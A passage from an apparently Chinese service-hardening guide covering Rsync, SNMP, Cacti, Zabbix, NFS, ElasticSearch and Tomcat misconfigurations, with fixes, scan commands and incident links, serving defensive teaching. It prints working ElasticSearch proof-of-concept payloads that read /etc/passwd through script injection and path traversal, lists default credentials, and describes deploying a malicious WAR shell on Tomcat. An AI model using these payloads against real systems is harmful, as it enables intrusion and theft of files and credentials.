**5、修复方案**

---
限定访问的IP

IPTables防火墙给rsync的端口添加一个iptables。

只希望能够从内部网络（192.168.101.0/24）访问：

	iptables -A INPUT -i eth0 -p tcp -s 192.168.101.0/24 --dport 873 -m state --state NEW,ESTABLISHED -j ACCEPT
	iptables -A OUTPUT -o eth0 -p tcp --sport 873 -m state --state ESTABLISHED -j ACCEPT
在rsyncd.conf使用hosts allow设置只允许来源ip：

	hosts allow = X.X.X.X #允许访问的IP
添加用户口令

在rsyncd.conf中添加rsync用户权限访问：

	secrets file = /etc/rsyncd.secrets #密码文件位置，认证文件设置，设置用户名和密码
	auth users = rsync #授权帐号,认证的用户名，如果没有这行则表明是匿名，多个用户用,分隔。
	
**6、漏洞扫描与发现**

---
半手动扫描

使用nmap扫描Rsync默认的端口（873）：

	nmap -n --open -p 873 X.X.X.X/24
找到开放873端口的主机后尝试连接：

	rsync X.X.X.X::
自动化扫描

使用Metasploit中的

	auxiliary/scanner/rsync/modules_list
模块对允许匿名访问的rsync进行扫描：

	use auxiliary/scanner/rsync/modules_list
	set rhosts X.X.X.X/24
	run

**7、相关资源**

---
[Rsync安全配置](http://drops.wooyun.org/papers/161)

[rsyncd.conf](https://www.samba.org/ftp/rsync/rsyncd.conf.html)



##SNMP安全配置

**1、SNMP简介**

---
简单网络管理协议（SNMP），由一组网络管理的标准组成，包含一个应用层协议（application layer protocol）、数据库模型（database schema）和一组资源对象。该协议能够支持网络管理系统，用以监测连接到网络上的设备是否有任何引起管理上关注的情况。该协议是互联网工程工作小组（IETF，Internet Engineering Task Force）定义的internet协议簇的一部分。SNMP的目标是管理互联网Internet上众多厂家生产的软硬件平台，因此SNMP受Internet标准网络管理框架的影响也很大。SNMP已经出到第三个版本的协议，其功能较以前已经大大地加强和改进了。

**2、SNMP服务架设**

---
测试环境:CentOS 6.5

	yum install net-snmp -y 
	/etc/init.d/snmpd start
	[root@centos ~]# netstat -antpleu  |grep snmp
	tcp        0      0 127.0.0.1:199               0.0.0.0:*                   LISTEN      0          35513      3300/snmpd          
	udp        0      0 0.0.0.0:161                 0.0.0.0:*                               0          35511      3300/snmpd      
配置文件

	/etc/snmp/snmpd.conf
	
**3、错误配置以及利用**

---
***3.1 默认团体字符串***

通过默认的团体字符串，可以获得主机的信息

***3.2 基于团体字符串的snmp的ddos攻击***

因为查询和返回的数据不对等，所以可以在知道团体字符串的情况下，使用的UDP协议，通过伪造来源IP，达到获取大流量，进行DDOS攻击

***3.3 CVE-2012-3268获得设备的密码***

知道团体字符串后，通过指定特定的oid，来获取设备的密码，从而达到控制设备的目的

相关的攻击原理：

[snmp弱口令引起的信息泄漏](http://drops.wooyun.org/tips/409)

**4、实际案例**
***4.1 弱口令***

[华为某服务器SNMP弱口令](http://www.wooyun.org/bugs/wooyun-2010-081037)

[极客公园某配置不当致敏感信息泄露](http://www.wooyun.org/bugs/wooyun-2010-092565)

[西北民族大学DNS服务器SNMP服务存在默认弱口令](http://www.wooyun.org/bugs/wooyun-2010-0576850)

***4.2 CVE-2012-3268***

[中国移动H3C防火墙侧漏，利用snmp获取管理员密码，成功登录设备](http://www.wooyun.org/bugs/wooyun-2013-021877)

[中粮我买网某设备缺陷导致密码破解进入内网（可内网未漫游）](http://www.wooyun.org/bugs/wooyun-2010-075706)

[通过snmp获取中国移动华为防火墙交换机等设备的登录密码](http://www.wooyun.org/bugs/wooyun-2010-032312)

[中国移动集团华为三层交换SNMP漏洞，可获取管理帐号密码，已成功登录](http://www.wooyun.org/bugs/wooyun-2013-021964)

**5、修复方案**

---
***5.1 修改默认的团体字符串名***

	
	vim /etc/snmp/snmpd.conf
	#允许任何IP通过public来连接
	com2sec notConfigUser  default       public
	#只允许1.1.1.1来使用public连接
	com2sec notConfigUser  1.1.1.1       public
	
***5.2 CVE-2012-3268***
如果条件允许在厂商的协助下进行升级，否则设置复杂的团体字符串

**6、漏洞扫描与发现**

---
***6.1 手工发现***

-p为团体字符串

	snmpwalk -v 2c -p public ip
***6.2 自动发现***

通过nmap扫描

	nmap -Pn -sU -p161 --script=brute 1.1.1.0/24
	
**7、相关资源**

---
[snmp弱口令引起的信息泄漏](http://drops.wooyun.org/tips/409)

[基于snmp的反射攻击的理论及其实现](http://drops.wooyun.org/tips/2106)

[CVE-2012-3268](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-3268)

[CVE-2012-3268利用工具](https://github.com/grutz/h3c-pt-tools)

##Cacti安全配置

**1、cacti简介**

---
Cacti 在英文中的意思是仙人掌的意思，Cacti是一套基于PHP,MySQL,SNMP及RRDTool开发的网络流量监测图形分析工具。它通过snmpget来获取数据，使用 RRDtool绘画图形，而且你完全可以不需要了解RRDtool复杂的参数。它提供了非常强大的数据和用户管理功能，可以指定每一个用户能查看树状结 构、host以及任何一张图，还可以与LDAP结合进行用户验证，同时也能自己增加模板，功能非常强大完善。

**2、cacti服务器假设**
具体搭建方法参考官网：

[官网搭建文档](http://docs.cacti.net/wiki:documentation)

**3、错误配置及利用**
***3.1 弱口令***

存在弱口令，cacti的登陆界面没有验证码的限制，很容易被爆破。登陆后，可以执行命令，获取服务器权限。同时泄露监控主机的相关信息

***3.2 使用低版本的插件***

例如Superlinks插件，具体的攻击方法参考exploit-db

[Cacti Superlinks Plugin 1.4-2 RCELFI via SQL Injection Exploit](https://www.exploit-db.com/exploits/35578/)

[Cacti Superlinks Plugin 1.4-2 - SQL Injection](https://www.exploit-db.com/exploits/33809/)

**4.实际案例**

---
[cacti后台登陆命令执行漏洞](http://www.wooyun.org/bugs/wooyun-2011-02674)

[sina cacti信息泄露](http://www.wooyun.org/bugs/wooyun-2010-0880)

[同程旅游某服务配置不当getshell入内网并泄露内网结构](http://www.wooyun.org/bugs/wooyun-2010-088773)

[民生电商某严重信息泄露(可shell可内网渗透)](http://www.wooyun.org/bugs/wooyun-2010-087003)

[ChinaCache 监控服务CACTI管理后台弱口令 (可ROOT服务器)](http://www.wooyun.org/bugs/wooyun-2013-032391)

[傲游cacti弱口令导致敏感信息泄漏](http://www.wooyun.org/bugs/wooyun-2010-042723)

[搜狐仙人掌系统弱口令](http://www.wooyun.org/bugs/wooyun-2010-023260)

**5.修复方案**

---
***5.1 修复cacti弱口令，尽量不要放置在外网。***

***5.2 对版本太旧的cacti进行升级。***

**6.漏洞扫描及发现**

---
收集企业WEB应用，是否包含Cacti。

**7.相关资源**

---
[渗透中寻找突破口的那些事](http://drops.wooyun.org/tips/2915)

[exploit-db search for cacti](https://www.exploit-db.com/search/?order_by=date&order=desc&pg=1&action=search&text=cacti)


##Zabbix安全配置

**1、zabbix简介**

---
zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。

zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。

zabbix由2部分构成，zabbix server与可选组件zabbix agent。

zabbix server可以通过SNMP，zabbix agent，ping，端口监视等方法提供对远程服务器/网络状态的监视，数据收集等功能，它可以运行在Linux，Solaris，HP-UX，AIX，Free BSD，Open BSD，OS X等平台上。

**2、zabbix服务架设**

---
***2.1 zabbix-server安装***

rpm安装的方式

	rpm -ivh http://repo.zabbix.com/zabbix/2.4/rhel/6/x86_64/zabbix-release-2.4-1.el6.noarch.rpm
	yum install zabbix-server zabbix-web-mysql zabbix-zabbix-web zabbix-agent zabbix-get http mysql-server -y
配置mysql数据库:

	vim /etc/my.cnf
	#默认字符集为utf-8
	default-character-set = utf8
	#innodb的每个表文件单独存储
	innodb_file_per_table = 1
创建相关的表

	mysql> create database zabbix character set utf8;
	mysql> grant all privileges on zabbix.* to zabbix@localhost identified by 'zabbix';
导入表结构

	cd /usr/share/doc/zabbix-server-mysql-2.4.4/create
	mysql -uroot -Dzabbix < schema.sql
	mysql -uroot -Dzabbix < images.sql
	mysql -uroot -Dzabbix < data.sql
配置zabbix-server

	vim /etc/zabbix/zabbix_server.conf
	LogFile=/var/log/zabbix/zabbix_server.log
	LogFileSize=0
	PidFile=/var/run/zabbix/zabbix_server.pid
	DBHost=localhost
	DBName=zabbix
	DBUser=zabbix
	DBPassword=zabbix
	DBSocket=/var/lib/mysql/mysql.sock
	DBPort=3306
	StartPollers=5
	SNMPTrapperFile=/var/log/snmptt/snmptt.log
	CacheSize=256M
	AlertScriptsPath=/etc/zabbix/script/alertscripts
	ExternalScripts=/etc/zabbix/script/externalscripts
	/etc/init.d/zabbix-server start
	/etc/init.d/mysqld start
	/etc/init.d/httpd start
浏览器http://ip/zabbix　按照提示配置

***2.2 zabbix-agent安装***

	rpm -ivh http://repo.zabbix.com/zabbix/2.4/rhel/6/x86_64/zabbix-release-2.4-1.el6.noarch.rpm
	yum install zabbix zabbix-agent -y
配置zabbix-agent

	vim /etc/zabbix/zabbix_agentd.conf
	PidFile=/var/run/zabbix/zabbix_agentd.pid
	LogFile=/var/log/zabbix/zabbix_agentd.log
	LogFileSize=0
	Server=服务端IP
	ServerActive=服务端IP
	Hostname=主机名
	
**3、错误配置以及利用**

---
***3.1 默认密码或者弱口令***

zabbix默认的口令为Admin:zabbix，或者存在弱口令，可以登录，登录后可以在后台自定义脚本，执行命令。

***3.2 开启guest账户***

默认安装后是开启了guest账户的，如果没有禁止，可以通过guest账户登录，查看信息

***3.3 开启了guest同时版本号<= 2.0.8***

zabbix版本⇐2.0.8的时候，httpmon.php页面存在注入;开启了guest账户后可以直接访问，进行sql注入攻击。

具体攻击方法参考:

[Zabbix SQL Injection/RCE – CVE-2013-5743](http://drops.wooyun.org/papers/680)

***3.4 zabbix前台注入***

---
漏洞具体利用方法:

[Zabbix的前台SQL注射漏洞0day一枚（官方测试受到影响）](http://www.wooyun.org/bugs/wooyun-2010-072075)

**4、实际案例**

---
***4.1 zabbix弱口令***

[土豆某zabbix弱口令](http://www.wooyun.org/bugs/wooyun-2010-069679)

[中国科学院计算机网络信息中心zabbix弱口令，导致命令执行](http://www.wooyun.org/bugs/wooyun-2010-084596)

***4.2 zabbix的httpmon.php页面注入***

[京东某站shell直入jae内网物理机内核版本过低](http://www.wooyun.org/bugs/wooyun-2010-086349)

[乐视ZabbbixSQL注入导致命令执行](http://www.wooyun.org/bugs/wooyun-2010-053420)

**5、修复方案**

---
zabbix最好不要放在外网

修改默认账户密码，同时禁用guest用户

对于重点的zabbix-server，最好能够做ACL访问限制

**6、发现问题**

---
收集企业WEB应用，是否包含Zabbix。

**7、相关资源**

---
[Zabbix SQL Injection/RCE – CVE-2013-5743](http://drops.wooyun.org/papers/680)

[当渗透遇到zabbix--小谈zabbix安全](http://drops.wooyun.org/tips/68)

[Zabbix的前台SQL注射漏洞0day一枚（官方测试受到影响）](http://www.wooyun.org/bugs/wooyun-2010-072075)


##NFS安全配置

**1、NFS简介**

---
NFS(Network File System)网络文件系统是FreeBSD支持的文件系统中的一种， 也被称为 NFS。 NFS允许一个系统在网络上与它人共享目录和文件。通过使用NFS，用户和程序可以象访问本地文件 一样访问远端系统上的文件。

使用NFS有以下好处：

	1、本地工作站使用更少的磁盘空间，因为通常的数据可以存放在一 台机器上而且可以通过网络访问到。
	2、用户不必在每个网络上机器里头都有一个home目录。Home目录 可以被放在NFS服务器上并且在网络上处处可用。
	3、诸如软驱，CDROM和Zip之类的存储设备可以在网络上面被别的机器使用。 这可以减少整个网络上的可移动介质设备的数量。
	NFS是不可以单独进行工作的，它必须跟portmap来协商生成的。Portmap用于提供RPC协议（远程过程调用）

NFS相关进程：

	rpc.nfsd：它是基本的NFS守护进程，主要功能是管理客户端是否能够登录服务器
	rpc.mountd：它是RPC安装守护进程，主要功能是管理NFS的文件系统。当客户端顺利通过rpc.nfsd登录NFS服务后，在使用NFS服务所提供的文凭前，还必须通过文件使用权限的验证。它会读取NFS的配置文件/etc/exports来对比客户端权限。
	portmap：portmap的主要功能是进行端口映射工作。当客户端尝试连接并使用RPC服务器提供的服务（如NFS服务）时，portmap会将所管理的与服务对应的端口提供给客户端，从而使客户可以通过该端口向服务器请求服务。
服务器必须运行以下服务：

	nfsd：NFS，为来自NFS客户端的 请求服务。
	mountd：NFS挂载服务，处理nfsd递交过来的请求。
	rpcbind：此服务允许 NFS 客户程序查询正在被 NFS 服务使用的端口。

**2、NFS服务器架设**

---
搭建环境：CentOS release 6.6 (Final) 安装软件包
	
	yum install nfs-utils
NFS相关文件

	/etc/exports：NFS服务的主要配置文件
	/usr/sbin/exportfs：NFS服务的管理命令
	/usr/sbin/showmount：客户端的查看命令
	/var/lib/nfs/etab：记录NFS分享出来的目录的完整权限设定值
	/var/lib/nfs/xtab：记录曾经登录过的客户端信息
启动服务

	/etc/init.d/rpcbind start
	/etc/init.d/nfs start
配置输出的路径

	vim /etc/exports
查看挂在出来的东西

	showmount -e ip
将ip:/var/test输出的目录，挂在到本机的/mnt下面

	mount-t nfs ip:/var/test /mnt
/etc/exports中配置的简单说明：

	<输出目录> [客户端1 选项（访问权限,用户映射,其他）] [客户端2 选项（访问权限,用户映射,其他）]
网段表示方法：

	不做限制，允许任何主机：*
	限定单个IP：192.168.5.6
	限定子网：192.168.5.0/24、192.168.5.0/255.255.255.0
	指定主机：test.wooyun.org
	限定一个域中的所有主机：*.wooyun.org
配置参数：

	ro：只读(默认配置)
	rw：可写
	root_squash：root用户的所有请求映射成如anonymous用户一样的权限（默认）
	subtree_check：如果共享/usr/bin之类的子目录时，强制NFS检查父目录的权限（默认）
	no_subtree_check：和上面相对，不检查父目录权限
	all_squash：共享文件的UID和GID映射匿名用户anonymous，适合公用目录
	no_all_squash：保留共享文件的UID和GID（默认）
	sync：同步模式，内存中数据时时写入磁盘
	async：不同步，把内存中数据定期写入磁盘中
	secure：NFS通过1024以下的安全TCP/IP端口发送
	insecure：NFS通过1024以上的端口发送
	wdelay：如果多个用户要写入NFS目录，则归组写入（默认）
	hide：在NFS共享目录中不共享其子目录
	no_hide：共享NFS目录的子目录
	no_root_squash：允许已root身份写入，如果不开启这个参数，NFS挂载端在以本机root身份写入东西的时候，生成的文件的文件的用户和属组均为nfsnobody
	anonuid=xxx：指定NFS服务器/etc/passwd文件中匿名用户的UID
	anongid=xxx：指定NFS服务器/etc/passwd文件中匿名用户的GID
	
**3、错误配置以利用**

---
***3.1、限制NFS可挂载的IP/IP段***
任何人都可以对输出的目录进行挂载，造成信息泄露

***3.2、未对NFS的权限存在问题，任何人均可写***
可挂载的情况下，如果发布的文件为web文件，可以直接写入webshell

**4、实际案例**

---
**5、修复方案****

---
***5.1、在/etc/exports中限制可以挂在的IP或IP段***
***5.2、错误的开放了可写权限***

**6、漏洞扫描与发现**

---
nmap扫描TCP 2049端口，然后试用showmount -e ip进行权限查看

	nmap -Pn -p2049 -sV --open ip
	showmount -e ip

**7、相关资源**

---
[网络文件系统](https://www.freebsd.org/doc/zh_CN.UTF-8/books/handbook/network-nfs.html)

[NFS配置与安装](http://phantom.iteye.com/blog/66673)

[Linux NFS服务器的安装与配置](http://www.cnblogs.com/mchina/archive/2013/01/03/2840040.html)

[NFS服务配置](http://www.92csz.com/study/linux/19.htm)

##ElasticSearch安全配置

**1、ElasticSearch简介**

---
ElasticSearch是JAVA开发的一个基于Lucene的搜索服务器，它提供了一个分布式多用户能力的全文搜索引擎。

很多小伙伴用ElasticSearch配合其它工具进行日志分析平台的搭建，但是ElasticSearch不同版本存在多个漏洞。

**2、ElasticSearch漏洞**

---
***2.1 ElasticSearch远程命令执行(CVE-2014-3120)***

漏洞介绍：

ElasticSearch有脚本执行(scripting)的功能，可以很方便地对查询出来的数据再加工处理。ElasticSearch用的脚本引擎是MVEL，这个引擎没有做任何的防护，或者沙盒包装，所以直接可以执行任意代码。

而在ElasticSearch 1.2之前的版本中，默认配置是打开动态脚本功能的，如果用户没有更改默认配置文件，攻击者可以直接通过http请求执行任意代码。

测试POC：

	http://127.0.0.1:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22%2Fetc%2Fhosts%22%3A%7B%22script%22%3A%22import%20java.util.*%3B%5Cnimport%20java.io.*%3B%5Cnnew%20Scanner(new%20File(%5C%22%2Fetc%2Fhosts%5C%22)).useDelimiter(%5C%22%5C%5C%5C%5CZ%5C%22).next()%3B%22%7D%2C%22%2Fetc%2Fpasswd%22%3A%7B%22script%22%3A%22import%20java.util.*%3B%5Cnimport%20java.io.*%3B%5Cnnew%20Scanner(new%20File(%5C%22%2Fetc%2Fpasswd%5C%22)).useDelimiter(%5C%22%5C%5C%5C%5CZ%5C%22).next()%3B%22%7D%7D%7D&callback=jQuery111107529820275958627_1400564696673&_=1400564696674
修复方法：

	1，升级ElasticSearch为最新版本；
	
	2，在配置文件elasticsearch.yml里为每一个节点都加上：script.disable_dynamic: true。

漏洞案例：

[果壳网某服务远程命令执行漏洞(非st2)](http://wooyun.org/bugs/wooyun-2014-061672)

***2.2 Elasticsearch Groovy命令执行漏洞(CVE-2015-1427)***

漏洞介绍：

该漏洞主要存在于ElastciSearch 1.3.0-1.3.7和1.4.0-1.4.2，ElasticSearch在比较新的版本中脚本语言引擎使用了Groovy，并且加入了沙盒进行控制，危险代码会被拦截掉。由于沙盒限制不严格，导致存在该漏洞。

测试POC:

	POST http://127.0.0.1:9200/_search?pretty 
	
	{"size":1,"script_fields": {"test#": {"script":"java.lang.Math.class.forName(\"java.io.BufferedReader\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\"java.io.InputStreamReader\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat /etc/passwd\").getInputStream())).readLines()","lang": "groovy"}}}
修复方法：

	1，升级ElasticSearch为最新版本；
	
	2，在配置文件elasticsearch.yml里为每一个节点都加上：script.groovy.sandbox.enabled: true。

漏洞案例：

[启维文化某服务器ElasticSearch Groovy命令执行漏洞](http://www.wooyun.org/bugs/wooyun-2015-099572)

***2.3 Elasticsearch 任意文件读取漏洞(CVE-2015-3337)***

测试POC:

	curl http://127.0.0.1:9200/_plugin/head/../../config/elasticsearch.yml 注意curl版本
	
	curl http://127.0.0.1:9200/_plugin/插件名称如head/../../xx文件
修复方法： 1，升级ElasticSearch为最新版本

***2.4 Elasticsearch 数据库配置文件读取问题***

测试POC:

[http://localhost:9200/_river/search](http://localhost:9200/_river/search)

[exp-db:CVE-2015-3337](https://www.exploit-db.com/exploits/37054/)

修复方法：

	1、安装elasticsearch官方的Shield
	
	2、添加iptables规则
	
	3、设置elasticsearch.yml文件中的network.bind_host: 内网ip,仅允许内网访问
	
## Apache Tomcat弱口令

### 1. Apache Tomcat简介
***
Tomcat是由Apache软件基金会下属的Jakarta项目开发的一个Servlet容器，按照Sun Microsystems提供的技术规范，实现了对Servlet和JavaServer Page（JSP）的支持，并提供了作为Web服务器的一些特有功能，如Tomcat管理和控制平台、安全域管理和Tomcat阀等。由于Tomcat本身也内含了一个HTTP服务器，它也可以被视作一个单独的Web服务器。

### 2、漏洞成因
***
配置Tomcat的时候使用了常用的用户名和弱口令，导致Tomcat可被攻击者登陆，并利用manager中的war部署功能上传恶意脚本最终导致服务器沦陷。

### 3、漏洞检测及利用
***
Tomcat的默认端口是8080端口，可使用nmap扫描服务器的8080端口寻找开放了tomcat的服务器：

    nmap -n --open -p 8080 X.X.X.X/24
找到了Tomcat服务器后就可以访问manager目录并尝试使用弱口令或者Tomcat默认的用户名和密码进行登陆。默认用户名为admin，默认密码为admin。 manager/html目录中可以上传部署war文件，将恶意的war上传并部署后访问war文件名所在的目录，如：http://xxx:8080/shell (假设上传的是shell.war)即可。

特殊情况下，若Tomcat服务器关闭了8080端口，也可使用8009端口。参见：Tomcat的8009端口AJP的利用。

### 4、漏洞修复
***
修改用户名和密码

修改tomcat-user.xml中的用户名和密码。将类似于如下的行进行修改。修改时要关闭Tomcat。

    <user username="admin" password="admin" roles="manager"/>
使用http.conf限制访问

使用http.conf限制对manager目录的访问：

    <Location "/manager">
    AllowOverride None
    deny from all
    allow from 127.0.0.1
    </Location>
使用iptables限制访问

使用iptables限制访问IP,只允许IP为X.X.X.X的主机访问8080端口：

    iptables -F
    iptables -P INPUT DROP
    iptables -A INPUT -p tcp -s X.X.X.X --dport 8080 -j ACCEPT
    iptables -A INPUT -p udp -s X.X.X.X --dport 8080 -j ACCEPT
8080端口关闭后，8009端口同样可能导致服务器被入侵，参见：[Tomcat的8009端口AJP的利用](http://drops.wooyun.org/tips/737)。 若发现Tomcat8009端口开放了也需要将其关闭。

### 5、实际案例
***
[中国电信销售管理系统tomcat弱口令(可shell)]()

[中国联通某分站存在Tomcat弱口令]()

[中国联通某分站存在Tomcat弱口令]()

### 6、参考资料
****
[Tomcat的8009端口AJP的利用]()

